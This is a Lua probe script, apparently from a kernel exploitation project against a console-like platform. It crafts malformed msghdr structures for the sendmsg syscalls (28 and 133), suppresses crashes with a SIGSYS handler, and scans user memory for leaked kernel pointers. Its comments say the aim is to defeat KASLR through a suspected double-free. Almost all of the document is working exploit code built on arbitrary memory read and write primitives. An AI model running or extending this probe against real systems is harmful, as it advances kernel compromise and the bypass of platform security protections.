-- CRASH_CLASS: MODERATE
-- PROBE 733a: does sys 28/133 publish a kernel pointer to the caller?
--
-- Context: static scan (DoubleFreePaths) of the 13.60 capture found helper
-- 0xffffffff8aef1bb0, shared by sys 28 and sys 133, writing a kernel malloc
-- buffer into the caller's output field at 0xffffffff8aef1ded and then freeing
-- that buffer at 0xffffffff8aef1d28 with no clearing store. The named trigger
-- is msg_control != NULL with msg_controllen outside [0xc, 0x800].
--
-- A dangling kernel pointer in user memory is a KASLR defeat on its own, so
-- this probe runs the shapes without any thread and scans the whole msghdr
-- page for kernel-shaped qwords after every call.

print("=== PROBE 733a: SENDMSG POINTER LEAK ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local Z = uint64(0)
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) local v=memory.read_qword(a) if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function wd(a,v) memory.write_dword(a,v) end
local function wq(a,v) memory.write_qword(a,v) end

-- SIGSYS shield with the proven struct form (710a): an absent number becomes -1
local act = to_num(memory.alloc(64)); local old = to_num(memory.alloc(64))
for k=0,15 do wq(act+k*8, Z) end
wd(act, 1)
local sok, srv = pcall(function() return mk(416)(U(12), U(act), U(old), Z, Z, Z) end)
print(string.format("[0] sigaction ok=%s ret=%s control=%s", tostring(sok), tostring(to_num(srv)),
    tostring((function() local ok,v=pcall(function() return mk(4095)(Z,Z,Z,Z,Z,Z) end) return ok and to_num(v) or "dead" end)())))

local sp = mk(135)
local fds = to_num(memory.alloc(64))
pcall(function() return sp(U(1),U(1),U(0),U(fds),Z,Z) end)
local fd = rd(fds)
print(string.format("[0] socketpair fd=%d", fd))

local HDR  = to_num(memory.alloc(0x1000))
local iov  = to_num(memory.alloc(0x4000))
local ctrl = to_num(memory.alloc(0x4000))
local data = to_num(memory.alloc(0x4000))
for k=0,0x3FF do wd(iov+k*4,0); wd(data+k*4,0x41414141); wd(ctrl+k*4,0x42424242) end

local function scan(tag)
    local hits = {}
    for off=0,0xF8,8 do
        local v = rq(HDR+off)
        local hi = math.floor(v/4294967296)
        if hi >= 0xFFFF8000 then hits[#hits+1] = string.format("+%02X=%016X", off, v) end
    end
    print(string.format("  [%s] kernel-shaped: %s", tag, #hits>0 and table.concat(hits," ") or "none"))
end

local function shape(tag, nr, iovlen, ctl, ctllen)
    for k=0,0x1FF do wd(HDR+k*4, 0) end
    wq(HDR+0x00, Z)                       -- msg_name
    wd(HDR+0x08, 0)                       -- msg_namelen
    wq(HDR+0x10, U(iov))                  -- msg_iov
    wd(HDR+0x18, iovlen)                  -- msg_iovlen
    wq(HDR+0x20, U(ctl))                  -- msg_control
    wd(HDR+0x28, ctllen)                  -- msg_controllen
    wd(HDR+0x2c, 0)                       -- msg_flags
    -- one iovec: 16 bytes of data
    wq(iov+0, U(data)); wq(iov+8, U(16))
    local ok, rv = pcall(function() return mk(nr)(U(fd), U(HDR), U(0), Z, Z, Z) end)
    print(string.format("[1] %-22s nr=%d iovlen=%d ctllen=%X ret=%s", tag, nr, iovlen, ctllen,
        ok and tostring(to_num(rv)) or "DEAD"))
    if ok then scan(tag) end
    return ok
end

if not shape("A normal",        28, 1, 0, 0) then return end
if not shape("B ctl=0x1000",    28, 1, ctrl, 0x1000) then return end
if not shape("C ctl=4",         28, 1, ctrl, 4) then return end
if not shape("D ctl=0xC",       28, 1, ctrl, 0xC) then return end
if not shape("E iovlen=0x41",   28, 0x41, 0, 0) then return end
if not shape("F nr=133 normal", 133, 1, 0, 0) then return end
if not shape("G nr=133 ctl",    133, 1, ctrl, 0x1000) then return end
print(string.format("[2] health=%d", to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
print("=== 733a DONE ===")
